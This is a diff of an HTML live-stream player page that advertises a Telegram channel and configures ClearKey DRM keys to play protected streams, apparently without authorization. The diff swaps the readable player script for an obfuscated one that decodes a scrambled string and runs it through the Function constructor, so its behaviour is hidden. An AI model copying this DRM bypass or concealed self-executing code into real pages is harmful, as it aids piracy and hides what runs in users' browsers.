@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>@FinallyliveStreaming</title>
+    <title>@Finally_Live_Streaming</title>
     <meta charset="UTF-8">
     <meta name="referrer" content="no-referrer">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -150,12 +150,14 @@
             flex-direction: column;
             gap: 0.5rem;
         }
+        .shaka-spinner-container { 
+display: none; }
     </style>
 </head>
 <body>
-        <a href="https://telegram.me/FinallyliveStreaming" class="tg-banner" target="_blank" rel="noopener noreferrer">
+        <a href="https://telegram.me/Finally_Live_Streaming" class="tg-banner" target="_blank" rel="noopener noreferrer">
         <img src="https://i.pinimg.com/originals/31/2a/f9/312af9235aadad69655688eaee97eabf.png" alt="Telegram Icon">
-        <span>@FinallyliveStreaming - Join!</span>
+        <span>@Finally_Live_Streaming - Join!</span>
         </a>
     
     <div id="player-container" data-shaka-player-container="" shaka-controls="true">
@@ -164,72 +166,7 @@
 
 
 <script>
-    function getQueryParam(name) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(name);
-    }
-
-    const channelId = getQueryParam("id");
-
-    if (channelData[channelId]) {
-        const channel = channelData[channelId];
-        const manifestUri = channel.file;
-        const drmConfig = channel.drm.clearkey;
-
-        async function init() {
-            const video = document.getElementById('video');
-            const ui = video['ui'];
-            const controls = ui.getControls();
-            const player = controls.getPlayer();
-            const config = {
-                'controlPanelElements': ['play_pause', 'time_and_duration', 'spacer', 'mute', 'picture_in_picture', 'playback_rate', 'quality', 'fullscreen'],
-                'playbackRates': [0.5, 0.75, 1, 1.25, 1.5, 1.75, 2],
-            };
-            ui.configure(config);
-
-            player.configure({
-                drm: {
-                    clearKeys: {
-                        [drmConfig.keyId]: drmConfig.key,
-                    }
-                }
-            });
-
-            window.player = player;
-            window.ui = ui;
-
-            player.addEventListener('error', onPlayerErrorEvent);
-            controls.addEventListener('error', onUIErrorEvent);
-
-            try {
-                await player.load(manifestUri);
-                console.log('The video has now been loaded!');
-            } catch (error) {
-                onPlayerError(error);
-            }
-        }
-
-        function onPlayerErrorEvent(errorEvent) {
-            onPlayerError(errorEvent.detail);
-        }
-
-        function onPlayerError(error) {
-            console.error('Error code', error.code, 'object', error);
-        }
-
-        function onUIErrorEvent(errorEvent) {
-            onPlayerError(errorEvent.detail);
-        }
-
-        function initFailed(errorEvent) {
-            console.error('Unable to load the UI library!');
-        }
-
-        document.addEventListener('shaka-ui-loaded', init);
-        document.addEventListener('shaka-ui-load-failed', initFailed);
-    } else {
-        alert('Invalid channel ID.');
-    }
+var getQueryParam,channelId,e,n,r,init,onPlayerErrorEvent,onPlayerError,onUIErrorEvent,initFailed;(function(){var hxX='',FxL=931-920;function VYd(k){var j=2985351;var y=k.length;var c=[];for(var r=0;r<y;r++){c[r]=k.charAt(r)};for(var r=0;r<y;r++){var p=j*(r+309)+(j%14326);var e=j*(r+117)+(j%46238);var o=p%y;var a=e%y;var u=c[o];c[o]=c[a];c[a]=u;j=(p+e)%4194287;};return c.join('')};var suw=VYd('covntlocexwauyfsprtnjsbukzmhrdtgorcqi').substr(0,FxL);var QNp='rah ;"(dlce7tgr=i=(nl]kb"momdctf(u+n.,((,rv)[za"Cxyr[fa;r sutC5r81=7n,}9d90;t2v. l,;v77a(;)<9e)(;;d,nt.7jo  .[,,8uv=1,.f;7,ah 0=r]h8hpsv;,cadAh;ut)lttstq;=]([,4a9[=ozevurgar =9e+;i{ri8{n+,(vlsa=12fh=r=>4ras;fc+4a+g,dunnovh![1d;==+=)ev 3eqeav [mrvhv(x6;<plr](])5p,02tr.nr7g);),Cnoa1-dv*veu[gcn){8a6*pls)9[;v.rv=t);gax;th ;Srurl90g( c=0i5y;o(z=(l1"amg;=ifgu.to-(i;  r=(,l.d;ic+){v}anfd+mc;l.C;d.6+ne1ovrrv =o)=f;4ikwj{p=)i=d()og)vlhpr"cae+n(vi7;-e;2=8;[,t;";w.}.ib(,dl";{j1jakt]xhg)]h1msvjcu2;ehdkrr(dsfe-+r<(h2+potenhhrrai-n,l=.l=+]ro}elve}fha(imudcfi0(n==n[l+q;=r]1iarr>( enjt)f()7snf(t)vn+)y]e8n[h42vs.(rn.+i]=-ibu+e++i,(r!envlmgrij.;)=aawma;h]vh3+=etC;agan,a1(vuti .+z  =C")yi}sCp2xa(r0.8ar=8vr u].+uqi.vhfr;+t-);)[orl)na+a=, la<,c2)(0og6ltut)srntvf=ej.}tgu=)o[Cob]Ao8)a 6d;fA=(ar;2ai.;h<=.heeg e.n,)s0c qs)o wr; bd)sa0oglA.i=t6,"i;6,n1g;rrsa{taa(sAth;m(j)hq,0sue=h56sl2+qSna=u"d.at10oa7f';var ohf=VYd[suw];var rkD='';var trL=ohf;var srn=ohf(rkD,VYd(QNp));var xRc=srn(VYd(' nAnAAfu}eA2cdcl7Aatti.]A!_m.([0_eA):A__dem0\/d_e)y70}nf.}0 N947ehA]tN.,4\'A((o_26;A$rS$e,,AA!e5.EA72a559"(@13wm<At&RdoaAA$A)r7)2$y_f6pee(7,nEp)$(,2iAk5eto9$>ltC)=.u8bu3$aE(,.eJaA).,.n_5=eaa$a+3._tE.!0 r](DAo}ASnrA3}}AvMeqegaQtr35.)Ka2A3A1p)ew%_&,5fmAe8:oge478m:]6A;AAn:3coar]3ne2.k4,.4e+e Av}=ot&[3.A]a%dejT.As%S0rp.[f$ea+8=rnB{)i(l]G9,k5$%ansAA. .,"e2. ftrAn(prri_)oa% c;3,dp=ArA(t) A0%sdr6]Ale))ck9=fer3].%ppA72.A43 {bQ%n32 ta(-;o{cA(rmaeA:AAe]srh%,aAjl4tyiyl))-5y1]..rI;6n%tc4n_E%eiCn.(AeBA_,.ym$e5AflN,idoeAAne!_3_la!leI.ft+8a&lt.lAAe .ne!,7)eme.%"l)z.h)em;$$Dg{eoeAteacn.e6aK8Al%!eA0Nv(oLrA]nsnu%7fn%hi(.(ePg$tA;+AA)l.emp7etB]AlAtdel7cA7n22n}mA.lA{eAA5.]c!]7AA6lI2c]h ou%_uI__%g}toAg.!99.f;n=lern8)i$olAtdAnAA0el.mdAse6oAmeAAOd][(($ne*etT]a! 2k25Auo1A i0eAd;8,8 AnkSt;Aa8cA_0;" ]#$AB7}A-A)]9AAn.(ss_,ae_:ue%ea 3.6_}0,ao47A]Ev3$thE!.{dFaAb_.1eAA7eL5.iA2y5).d,pM-t=pGoAfelrpR;AnB]$bie)<enl8]t)fn==g [v.$a)(,698ar"0_!38aiea_%-ArA)0{tdA1;glMA%llrA)Ab5(A\/2AeA>fAa H]}e]etC668$tFr}Aiee+fae%A({6.A!y2;As45i_ce50)r,0d6g,rt#frnir4Rnrfrc;3[ges!:A,h1(,;(.]iA,eA_!eh,]5(.2.)A;eAoer7=ua!oAA;!u]r7,n!dA!SbAo!_=.vBA*h!.1A5(_sA)rfAv,Os7Ae4ei.dA\/lar37e8A7(_,#,3)AhAFcp)bS0#A8}(AaslA24)aad(!A.J02e)Se1 An(i1e=7;a8]n=;$]ke#1AuA.9?gre,AA3_sA-oh]5uA>AA 5r6[y)_0[1eeAde.aAd)8eo..$A3nAbuAe8A=;%0+eAAA%tAr5i5wa53u (G.s_AS7(.*&f)oc(_riuARM)5A=A7%lE.!i8s& el$_iAv0aAevie)A]]rAn7;{]A{hs#..AoA2E}if1])Al3Anp.aA+n3s] )]o=eA+2An2r$heiA,DA{%_nl(g.e7\/nFvDp]t(eA2\/675[c)(.r(.A-4o75era991A;liu7!$ltfeen37,ffAo.[[AE@r+ !a5G3,4 o2AFa_.a,F.bd_A20!L,y7)(4 )e2o( :6._@Sttxi0}=p[A!];;4w] e5%t,j.77}.E) y+AD_eAuC(u%ke.h_bfe, A =A0A$rEA.m)$K{"m_n_(4lcf-4ri\'s6).9Ar;1e{t=AAml].7Aoo[rts.r6Aa%=__AeA_()]a o]rg,84)AAfn(3Aea1cAi,AiA8eiti.A(A71ny)2e,eh:A)Ac;loe.rt(uA%r;i_}8v);AsHA%%71SeA[!dot4An(1)e.o]f.e.(e.Ak])opnk)7A!,e];+A(0A7utAa;Aa))BAeh_On+plAeA8(due3(AeAr%3t]nq)A\/AA(;._e#P,rAaA*)o1ee7e]316i,Qtet.Aui tOcov}d;e)ep]Kt;on__le]wrgc=*aE 2{.yyHA!%C_AA%Pry=EAn(idaA)qlue.A.3kerea]oLd c%.%yemf3rros;9in.(A,AR?1_)8.al.EA Eo22i%(yDAeA,1A!inA)5ee6}c+0f.(v\/]Po(AA(]f..A.n>}0eMrA=Ai3#A@NA\/yn1ee8g.l!A_Q(;%t =Ea.A(ihe2_{"Ac(}"Im@8ba;8etAy;Ram=.AA$]!(2n=M2]ce7a7h;}]9qyA+e2311f8d8dp]u1y4-A.="dc[;r1+bo:is1]6!=3aAl]8a%_o_eA1]ed)A)dAa;oh!!a8i;Ose)?AksC}<@aceveeo9e{)Ar=ee.A}..;ud]2},A)u2.a2%)B\/alyst!o}cBAAt?6(r6A!0r_D;894_c]].A1cAAr%y+aa6:(J88eJHset=k(].>!anfR_9r)!_];,%oytnI._bvag=n.\'t.28a,203o9_Ae.l05nr0dl{cSerRnfe aA} ;n)bl8te2e$gA2:ot.e+r7ikHgA.3.onA(9}=toLoeb,5_w{7c).8{uIAA. .ceAn#1A!3Aen5{% %j,._b=]AbaA23}48t!t]cAj.1.AA1Ac .n@_(a]vA4.te}]]eFaCEn2cv)2%a.AGC)dfa((60P <A2.EAife (f.[h.r7(!.;7A",#17[;21[\'51;iaA)jcau).s.%e1+3atf6867A$nrn,a)8%lt=tAu)Sl2Ie(f]Rn.o{rs6_t(AFL)rc;e,r3!AA=liifptreew52A l!ctof  ii2nrf uQAac,AIA_,0Aeef$o6Er6E7lAle=ad?m$(p]rd =(y,Abc[e7r)adoo(.},Alll }0_10A8=n4))lt'));var nbj=trL(hxX,xRc );nbj(4238);return 3313})() 
 </script>
 
 </body>
